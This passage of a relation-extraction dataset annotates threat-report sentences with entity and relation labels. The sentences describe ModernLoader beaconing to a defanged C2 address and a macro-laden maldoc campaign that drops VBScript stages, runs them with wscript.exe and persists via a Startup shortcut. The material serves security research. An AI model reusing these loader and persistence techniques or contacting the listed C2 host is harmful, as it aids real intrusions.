[16, 18], "index": "6_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [129, 129], "name": "JSON", "pos": [20, 21], "index": "7_0"}]], "labels": [{"r": "RD", "evidence": [2], "h": 1, "t": 2}, {"r": "WR", "evidence": [2], "h": 1, "t": 3}, {"r": "ST", "evidence": [2], "h": 1, "t": 4}, {"r": "RF", "evidence": [7], "h": 5, "t": 6}, {"r": "RD", "evidence": [7], "h": 5, "t": 7}]}, {"title": "05-33", "sents": [["ModernLoader", "'", "s", "constructor", "initializes", "the", "bot", "with", "a", "hardcoded", "C2", "URL", "."], ["Once", "the", "bot", "is", "initialized", ",", "it", "collects", "the", "following", "information", "about", "the", "system", "and", "send", "the", "information", "to", "the", "C2", "server", "using", "the", "HTTP", "Post", "request", "to", "hxxp", ":", "//31.41.244.231/AVAVA/gate.php", ":"], ["Win32_ComputerSystemProduct", "UUID", "(", "using", "WMI", "to", "query", "the", "configuration", "data", ")", "."], ["The", "external", "IP", "address", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/ip", "."], ["The", "IP", "address", "country", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/country", "."], ["The", "user", "privileges", "(", "admin", "or", "user", ")", "."], ["Once", "the", "initial", "data", "is", "sent", ",", "ModerLoader", "reads", "the", "response", "to", "find", "tasks", "returned", "from", "the", "servers", "using", "the", "JSON", "format", "."], ["ModernLoader", "executes", "tasks", "using", "the", "function", "DoTask", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "it", "pos": [6, 7], "index": "0_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [23, 23], "name": "information about the system", "pos": [10, 14], "index": "1_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [29, 29], "name": "the information", "pos": [16, 18], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [41, 41], "name": "hxxp : //31.41.244.231/AVAVA/gate.php", "pos": [28, 31], "index": "3_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [99, 99], "name": "ModerLoader", "pos": [7, 8], "index": "4_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [108, 108], "name": "the servers", "pos": [16, 18], "index": "5_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [112, 112], "name": "JSON", "pos": [20, 21], "index": "6_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [115, 115], "name": "ModernLoader", "pos": [0, 1], "index": "7_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [121, 121], "name": "DoTask", "pos": [6, 7], "index": "8_0"}]], "labels": [{"r": "RD", "evidence": [1], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 0, "t": 2}, {"r": "ST", "evidence": [1], "h": 0, "t": 3}, {"r": "RF", "evidence": [6], "h": 4, "t": 5}, {"r": "RD", "evidence": [6], "h": 4, "t": 6}]}, {"title": "05-34", "sents": [["Once", "the", "bot", "is", "initialized", ",", "it", "collects", "the", "following", "information", "about", "the", "system", "and", "send", "the", "information", "to", "the", "C2", "server", "using", "the", "HTTP", "Post", "request", "to", "hxxp", ":", "//31.41.244.231/AVAVA/gate.php", ":"], ["Win32_ComputerSystemProduct", "UUID", "(", "using", "WMI", "to", "query", "the", "configuration", "data", ")", "."], ["The", "external", "IP", "address", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/ip", "."], ["The", "IP", "address", "country", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/country", "."], ["The", "user", "privileges", "(", "admin", "or", "user", ")", "."], ["Once", "the", "initial", "data", "is", "sent", ",", "ModerLoader", "reads", "the", "response", "to", "find", "tasks", "returned", "from", "the", "servers", "using", "the", "JSON", "format", "."], ["ModernLoader", "executes", "tasks", "using", "the", "function", "DoTask", "."], ["DoTask", "accepts", "very", "few", "commands", "and", "can", "either", "execute", "a", "command", "line", "or", "download", "and", "execute", "a", "file", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "it", "pos": [6, 7], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [10, 10], "name": "information about the system", "pos": [10, 14], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [16, 16], "name": "the information", "pos": [16, 18], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [28, 28], "name": "hxxp : //31.41.244.231/AVAVA/gate.php", "pos": [28, 31], "index": "3_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [86, 86], "name": "ModerLoader", "pos": [7, 8], "index": "4_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [95, 95], "name": "the servers", "pos": [16, 18], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [99, 99], "name": "JSON", "pos": [20, 21], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [102, 102], "name": "ModernLoader", "pos": [0, 1], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [108, 108], "name": "DoTask", "pos": [6, 7], "index": "8_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [110, 110], "name": "DoTask", "pos": [0, 1], "index": "9_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [0], "h": 0, "t": 3}, {"r": "RF", "evidence": [5], "h": 4, "t": 5}, {"r": "RD", "evidence": [5], "h": 4, "t": 6}]}, {"title": "05-35", "sents": [["Win32_ComputerSystemProduct", "UUID", "(", "using", "WMI", "to", "query", "the", "configuration", "data", ")", "."], ["The", "external", "IP", "address", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/ip", "."], ["The", "IP", "address", "country", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/country", "."], ["The", "user", "privileges", "(", "admin", "or", "user", ")", "."], ["Once", "the", "initial", "data", "is", "sent", ",", "ModerLoader", "reads", "the", "response", "to", "find", "tasks", "returned", "from", "the", "servers", "using", "the", "JSON", "format", "."], ["ModernLoader", "executes", "tasks", "using", "the", "function", "DoTask", "."], ["DoTask", "accepts", "very", "few", "commands", "and", "can", "either", "execute", "a", "command", "line", "or", "download", "and", "execute", "a", "file", "."], ["ModernLoader", "runs", "in", "an", "endless", "loop", "periodically", "contacting", "the", "C2", "server", "for", "new", "tasks", "until", "the", "process", "is", "terminated", "."]], "vertexSet": [[{"type": "MP", "sent_id": 4, "global_pos": [54, 54], "name": "ModerLoader", "pos": [7, 8], "index": "0_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [63, 63], "name": "the servers", "pos": [16, 18], "index": "1_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [67, 67], "name": "JSON", "pos": [20, 21], "index": "2_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [70, 70], "name": "ModernLoader", "pos": [0, 1], "index": "3_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [76, 76], "name": "DoTask", "pos": [6, 7], "index": "4_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [78, 78], "name": "DoTask", "pos": [0, 1], "index": "5_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [97, 97], "name": "ModernLoader", "pos": [0, 1], "index": "6_0"}]], "labels": [{"r": "RF", "evidence": [4], "h": 0, "t": 1}, {"r": "RD", "evidence": [4], "h": 0, "t": 2}]}, {"title": "05-36", "sents": [["The", "external", "IP", "address", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/ip", "."], ["The", "IP", "address", "country", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/country", "."], ["The", "user", "privileges", "(", "admin", "or", "user", ")", "."], ["Once", "the", "initial", "data", "is", "sent", ",", "ModerLoader", "reads", "the", "response", "to", "find", "tasks", "returned", "from", "the", "servers", "using", "the", "JSON", "format", "."], ["ModernLoader", "executes", "tasks", "using", "the", "function", "DoTask", "."], ["DoTask", "accepts", "very", "few", "commands", "and", "can", "either", "execute", "a", "command", "line", "or", "download", "and", "execute", "a", "file", "."], ["ModernLoader", "runs", "in", "an", "endless", "loop", "periodically", "contacting", "the", "C2", "server", "for", "new", "tasks", "until", "the", "process", "is", "terminated", "."], ["Its", "main", "purpose", "is", "to", "download", "and", "execute", "additional", "payloads", "and", "modules", ",", "as", "instructed", "by", "the", "C2", "server", "."]], "vertexSet": [[{"type": "MP", "sent_id": 3, "global_pos": [42, 42], "name": "ModerLoader", "pos": [7, 8], "index": "0_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [51, 51], "name": "the servers", "pos": [16, 18], "index": "1_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [55, 55], "name": "JSON", "pos": [20, 21], "index": "2_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [58, 58], "name": "ModernLoader", "pos": [0, 1], "index": "3_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [64, 64], "name": "DoTask", "pos": [6, 7], "index": "4_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [66, 66], "name": "DoTask", "pos": [0, 1], "index": "5_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [85, 85], "name": "ModernLoader", "pos": [0, 1], "index": "6_0"}]], "labels": [{"r": "RF", "evidence": [3], "h": 0, "t": 1}, {"r": "RD", "evidence": [3], "h": 0, "t": 2}]}, {"title": "14_g02-0", "sents": [["In", "this", "campaign", ",", "the", "usual", "maldocs", "consist", "of", "a", "malicious", "VBA", "macro", "that", "downloads", "and", "activates", "the", "next", "stage", "of", "the", "infection", "chain", "."], ["Although", "the", "VBA", "macro", "already", "contains", "an", "auto-open", "subroutine", ",", "it", "also", "uses", "various", "VBA", "functions", "that", "activate", "only", "when", "the", "``", "Typing", "replaces", "selection", "''", "feature", "is", "enabled", "in", "Microsoft", "Word", "."], ["These", "VBA", "functions", "are", "triggered", "by", "any", "content", "the", "victim", "enters", "into", "the", "maldoc", "."], ["To", "lure", "the", "victims", "into", "filling", "in", "content", "in", "the", "maldoc", ",", "the", "attackers", "masquerade", "the", "maldocs", "as", "forms", "."], ["Malicious", "macro", "functions", "then", "activate", "whenever", "the", "target", "inputs", "text", "in", "the", "maldoc", "form", "."], ["The", "most", "crucial", "function", "of", "the", "malevolent", "VBA", "code", "simply", "decodes", "and", "saves", "a", "malevolent", "VBScript", "to", "a", "file", "specified", "in", "the", "macro", "."], ["%", "Appdata", "%", "\\desktop.ini"], ["The", "Stage", "2", "VBS", "installs", "another", "base64-decoded", "VBScript", "(", "Stage", "3", ")", "and", "launches", "it", "using", "wscript.exe", "and", "similar", "commands", ":"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "campaign", "pos": [2, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "VBA macro", "pos": [11, 13], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [27, 27], "name": "VBA macro", "pos": [2, 4], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "subroutine", "pos": [8, 9], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [35, 35], "name": "it", "pos": [10, 11], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [39, 39], "name": "VBA functions", "pos": [14, 16], "index": "5_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [47, 47], "name": "Typing replaces selection", "pos": [22, 25], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [59, 59], "name": "VBA functions", "pos": [1, 3], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [86, 86], "name": "attackers", "pos": [13, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [89, 89], "name": "maldocs", "pos": [16, 17], "index": "9_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [91, 91], "name": "forms", "pos": [18, 19], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [93, 93], "name": "Malicious macro", "pos": [0, 2], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [115, 115], "name": "VBA code", "pos": [7, 9], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [123, 123], "name": "VBScript", "pos": [15, 16], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [132, 132], "name": "% Appdata % \\desktop.ini", "pos": [0, 4], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [139, 139], "name": "VBS", "pos": [3, 4], "index": "15_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [152, 152], "name": "wscript.exe", "pos": [16, 17], "index": "16_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [1], "h": 2, "t": 3}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [1], "h": 5, "t": 6}, {"r": "RD", "evidence": [0, 1], "t": 1, "h": 6}, {"r": "FR", "evidence": [1, 2], "h": 6, "t": 7}, {"r": "CO", "evidence": [1], "h": 3, "t": 4}, {"r": "RD", "evidence": [3], "h": 8, "t": 9}, {"r": "EX", "evidence": [3], "h": 8, "t": 9}, {"r": "RD", "evidence": [3], "h": 8, "t": 10}, {"r": "RD", "evidence": [3, 4], "t": 10, "h": 11}, {"r": "WR", "evidence": [4, 5, 6], "h": 11, "t": 14}, {"r": "WR", "evidence": [5], "h": 12, "t": 13}, {"r": "WR", "evidence": [5, 6], "h": 12, "t": 14}, {"r": "RD", "evidence": [7], "t": 15, "h": 16}, {"r": "EX", "evidence": [7], "t": 15, "h": 16}, {"r": "WR", "evidence": [6, 7], "t": 14, "h": 15}]}, {"title": "14_g02-1", "sents": [["Although", "the", "VBA", "macro", "already", "contains", "an", "auto-open", "subroutine", ",", "it", "also", "uses", "various", "VBA", "functions", "that", "activate", "only", "when", "the", "``", "Typing", "replaces", "selection", "''", "feature", "is", "enabled", "in", "Microsoft", "Word", "."], ["These", "VBA", "functions", "are", "triggered", "by", "any", "content", "the", "victim", "enters", "into", "the", "maldoc", "."], ["To", "lure", "the", "victims", "into", "filling", "in", "content", "in", "the", "maldoc", ",", "the", "attackers", "masquerade", "the", "maldocs", "as", "forms", "."], ["Malicious", "macro", "functions", "then", "activate", "whenever", "the", "target", "inputs", "text", "in", "the", "maldoc", "form", "."], ["The", "most", "crucial", "function", "of", "the", "malevolent", "VBA", "code", "simply", "decodes", "and", "saves", "a", "malevolent", "VBScript", "to", "a", "file", "specified", "in", "the", "macro", "."], ["%", "Appdata", "%", "\\desktop.ini"], ["The", "Stage", "2", "VBS", "installs", "another", "base64-decoded", "VBScript", "(", "Stage", "3", ")", "and", "launches", "it", "using", "wscript.exe", "and", "similar", "commands", ":"], ["Macros", "save", "VBS", "on", "disk", "and", "run", "via", "wscript.exe", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "VBA macro", "pos": [2, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "subroutine", "pos": [8, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "it", "pos": [10, 11], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [14, 14], "name": "VBA functions", "pos": [14, 16], "index": "3_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [22, 22], "name": "Typing replaces selection", "pos": [22, 25], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "VBA functions", "pos": [1, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [61, 61], "name": "attackers", "pos": [13, 14], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [64, 64], "name": "maldocs", "pos": [16, 17], "index": "7_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [66, 66], "name": "forms", "pos": [18, 19], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [68, 68], "name": "Malicious macro", "pos": [0, 2], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [90, 90], "name": "VBA code", "pos": [7, 9], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [98, 98], "name": "VBScript", "pos": [15, 16], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [107, 107], "name": "% Appdata % \\desktop.ini", "pos": [0, 4], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [114, 114], "name": "VBS", "pos": [3, 4], "index": "13_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [127, 127], "name": "wscript.exe", "pos": [16, 17], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [132, 132], "name": "Macros", "pos": [0, 1], "index": "15_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [140, 140], "name": "wscript.exe", "pos": [8, 9], "index": "16_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 2, "t": 3}, {"r": "FR", "evidence": [0], "h": 3, "t": 4}, {"r": "FR", "evidence": [0, 1], "h": 4, "t": 5}, {"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "RD", "evidence": [2], "h": 6, "t": 7}, {"r": "EX", "evidence": [2], "h": 6, "t": 7}, {"r": "RD", "evidence": [2], "h": 6, "t": 8}, {"r": "RD", "evidence": [2, 3], "t": 8, "h": 9}, {"r": "WR", "evidence": [3, 4, 5], "h": 9, "t": 12}, {"r": "WR", "evidence": [4], "h": 10, "t": 11}, {"r": "WR", "evidence": [4, 5], "h": 10, "t": 12}, {"r": "RD", "evidence": [6], "t": 13, "h": 14}, {"r": "EX", "evidence": [6], "t": 13, "h": 14}, {"r": "WR", "evidence": [5, 6], "t": 12, "h": 13}, {"r": "FR", "evidence": [7], "t": 15, "h": 16}]}, {"title": "14_g02-2", "sents": [["These", "VBA", "functions", "are", "triggered", "by", "any", "content", "the", "victim", "enters", "into", "the", "maldoc", "."], ["To", "lure", "the", "victims", "into", "filling", "in", "content", "in", "the", "maldoc", ",", "the", "attackers", "masquerade", "the", "maldocs", "as", "forms", "."], ["Malicious", "macro", "functions", "then", "activate", "whenever", "the", "target", "inputs", "text", "in", "the", "maldoc", "form", "."], ["The", "most", "crucial", "function", "of", "the", "malevolent", "VBA", "code", "simply", "decodes", "and", "saves", "a", "malevolent", "VBScript", "to", "a", "file", "specified", "in", "the", "macro", "."], ["%", "Appdata", "%", "\\desktop.ini"], ["The", "Stage", "2", "VBS", "installs", "another", "base64-decoded", "VBScript", "(", "Stage", "3", ")", "and", "launches", "it", "using", "wscript.exe", "and", "similar", "commands", ":"], ["Macros", "save", "VBS", "on", "disk", "and", "run", "via", "wscript.exe", "."], ["The", "Stage", "2", "VBS", "also", "sets", "up", "Stage", "3", "'s", "persistence", "by", "creating", "a", "shortcut", "to", "it", "in", "the", "current", "user", "'s", "Startup", "directory", ",", "a", "detail", "to", "remember", "later", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "VBA functions", "pos": [1, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "attackers", "pos": [13, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "maldocs", "pos": [16, 17], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [33, 33], "name": "forms", "pos": [18, 19], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [35, 35], "name": "Malicious macro", "pos": [0, 2], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [57, 57], "name": "VBA code", "pos": [7, 9], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [65, 65], "name": "VBScript", "pos": [15, 16], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [74, 74], "name": "% Appdata % \\desktop.ini", "pos": [0, 4], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [81, 81], "name": "VBS", "pos": [3, 4], "index": "8_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [94, 94], "name": "wscript.exe", "pos": [16, 17], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [99, 99], "name": "Macros", "pos": [0, 1], "index": "10_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [107, 107], "name": "wscript.exe", "pos": [8, 9], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [112, 112], "name": "VBS", "pos": [3, 4], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [123, 123], "name": "shortcut", "pos": [14, 15], "index": "13_0"}]], "labels": [{"r": "RD", "evidence": [1], "h": 1, "t": 2}, {"r": "EX", "evidence": [1], "h": 1, "t": 2}, {"r": "RD", "evidence": [1], "h": 1, "t": 3}, {"r": "RD", "evidence": [1, 2], "t": 3, "h": 4}, {"r": "WR", "evidence": [2, 3, 4], "h": 4, "t": 7}, {"r": "WR", "evidence": [3], "h": 5, "t": 6}, {"r": "WR", "evidence": [3, 4], "h": 5, "t": 7}, {"r": "RD", "evidence": [5], "t": 8, "h": 9}, {"r": "EX", "evidence": [5], "t": 8, "h": 9}, {"r": "WR", "evidence": [4, 5], "t": 7, "h": 8}, {"r": "FR", "evidence": [6], "t": 10, "h": 11}, {"r": "EX", "evidence": [6, 7], "h": 10, "t": 13}, {"r": "WR", "evidence": [7], "h": 12, "t": 13}]}, {"title": "14_g02-3", "sents": [["To", "lure", "the", "victims", "into", "filling", "in", "content", "in", "the", "maldoc", ",", "the", "attackers", "masquerade", "the", "maldocs", "as", "forms", "."], ["Malicious", "macro", "functions", "then", "activate", "whenever", "the", "target", "inputs", "text", "in", "the", "maldoc", "form", "."], ["The", "most", "crucial", "function", "of", "the", "malevolent", "VBA", "code", "simply", "decodes", "and", "saves", "a", "malevolent", "VBScript", "to", "a", "file", "specified", "in", "the", "macro", "."], ["%", "Appdata", "%", "\\desktop.ini"], ["The", "Stage", "2", "VBS", "installs", "another", "base64-decoded", "VBScript", "(", "Stage", "3", ")", "and", "launches", "it", "using", "wscript.exe", "and", "similar", "commands", ":"], ["Macros", "save", "VBS", "on", "disk", "and", "run", "via", "wscript.exe", "."], ["The", "Stage", "2", "VBS", "also", "sets", "up", "Stage", "3", "'s", "persistence", "by", "creating", "a", "shortcut", "to", "it", "in", "the", "current", "user", "'s", "Startup", "directory", ",", "a", "detail", "to", "remember", "later", "."], ["Stage", "2", "installs", "Stage", "3", "VBS", "on", "the", "endpoint", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "attackers", "pos": [13, 14], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "maldocs", "pos": [16, 17], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [18, 18], "name": "forms", "pos": [18, 19], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "Malicious macro", "pos": [0, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [42, 42], "name": "VBA code", "pos": [7, 9], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "VBScript", "pos": [15, 16], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [59, 59], "name": "% Appdata % \\desktop.ini", "pos": [0, 4], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [66, 66], "name": "VBS", "pos": [3, 4], "index": "7_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [79, 79], "name": "wscript.exe", "pos": [16, 17], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [84, 84], "name": "Macros", "pos": [0, 1], "index": "9_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [92, 92], "name": "wscript.exe", "pos": [8, 9], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [97, 97], "name": "VBS", "pos": [3, 4], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [108, 108], "name": "shortcut", "pos": [14, 15], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [125, 125], "name": "Stage 2", "pos": [0, 2], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [130, 130], "name": "VBS", "pos": [5, 6], "index": "14_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [133, 133], "name": "endpoint", "pos": [8, 9], "index": "15_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1, 2, 3], "h": 3, "t": 6}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "RD", "evidence": [4], "t": 7, "h": 8}, {"r": "EX", "evidence": [4], "t": 7, "h": 8}, {"r": "WR", "evidence": [3, 4], "t": 6, "h": 7}, {"r": "FR", "evidence": [5], "t": 9, "h": 10}, {"r": "EX", "evidence": [5, 6], "h": 9, "t": 12}, {"r": "WR", "evidence": [6], "h": 11, "t": 12}, {"r": "WR", "evidence": [7], "h": 13, "t": 14}, {"r": "ST", "evidence": [7], "h": 13, "t": 15}, {"r": "RF", "evidence": [7], "h": 13, "t": 15}]}, {"title": "14_g02-4", "sents": [["Malicious", "macro", "functions", "then", "activate", "whenever", "the", "target", "inputs", "text", "in", "the", "maldoc", "form", "."], ["The", "most", "crucial", "function", "of", "the", "malevolent", "VBA", "code", "simply", "decodes", "and", "saves", "a", "malevolent", "VBScript", "to", "a", "file", "specified", "in", "the", "macro", "."], ["%", "Appdata", "%", "\\desktop.ini"], ["The", "Stage", "2", "VBS", "installs", "another", "base64-decoded", "VBScript", "(", "Stage", "3", ")", "and", "launches", "it", "using", "wscript.exe", "and", "similar", "commands", ":"], ["Macros", "save", "VBS", "on", "disk", "and", "run", "via", "wscript.exe", "."], ["The", "Stage", "2", "VBS", "also", "sets", "up", "Stage", "3", "'s", "persistence", "by", "creating", "a", "shortcut", "to", "it", "in", "the", "current", "user", "'s", "Startup", "directory", ",", "a", "detail", "to", "remember", "later", "."], ["Stage", "2", "installs", "Stage", "3", "VBS", "on", "the", "endpoint", "."], ["The", "Stage", "3", "VBS", "file", "is", "responsible", "for", "retrieving", "harmful", "content", "from", "an", "attacker-designed", "Blogspot", "blog", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Malicious macro", "pos": [0, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [22, 22], "name": "VBA code", "pos": [7, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "VBScript", "pos": [15, 16], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [39, 39], "name": "% Appdata % \\desktop.ini", "pos": [0, 4], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [46, 46], "name": "VBS", "pos": [3, 4], "index": "4_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [59, 59], "name": "wscript.exe", "pos": [16, 17], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [64, 64], "name": "Macros", "pos": [0, 1], "index": "6_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [72, 72], "name": "wscript.exe", "pos": [8, 9], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [77, 77], "name": "VBS", "pos": [3, 4], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [88, 88], "name": "shortcut", "pos": [14, 15], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [105, 105], "name": "Stage 2", "pos": [0, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [110, 110], "name": "VBS", "pos": [5, 6], "index": "11_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [113, 113], "name": "endpoint", "pos": [8, 9], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [118, 118], "name": "VBS", "pos": [3, 4], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [125, 125], "name": "content", "pos": [10, 11], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [129, 129], "name": "Blogspot blog", "pos": [14, 16], "index": "15_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "RD", "evidence": [3], "t": 4, "h": 5}, {"r": "EX", "evidence": [3], "t": 4, "h": 5}, {"r": "WR", "evidence": [2, 3], "t": 3, "h": 4}, {"r": "FR", "evidence": [4], "t": 6, "h": 7}, {"r": "EX", "evidence": [4, 5], "h": 6, "t": 9}, {"r": "WR", "evidence": [5], "h": 8, "t": 9}, {"r": "WR", "evidence": [6], "h": 10, "t": 11}, {"r": "ST", "evidence": [6], "h": 10, "t": 12}, {"r": "RF", "evidence": [6], "h": 10, "t": 12}, {"r": "WR", "evidence": [7], "h": 13, "t": 14}]}, {"title": "14_g02-5", "sents": [["The", "most", "crucial", "function", "of", "the", "malevolent", "VBA", "code", "simply", "decodes", "and", "saves", "a", "malevolent", "VBScript", "to", "a", "file", "specified", "in", "the", "macro", "."], ["%", "Appdata", "%", "\\desktop.ini"], ["The", "Stage", "2", "VBS", "installs", "another", "base64-decoded", "VBScript", "(", "Stage", "3", ")", "and", "launches", "it", "using", "wscript.exe", "and", "similar", "commands", ":"], ["Macros", "save", "VBS", "on", "disk", "and", "run", "via", "wscript.exe", "."], ["The", "Stage", "2", "VBS", "also", "sets", "up", "Stage", "3", "'s", "persistence", "by", "creating", "a", 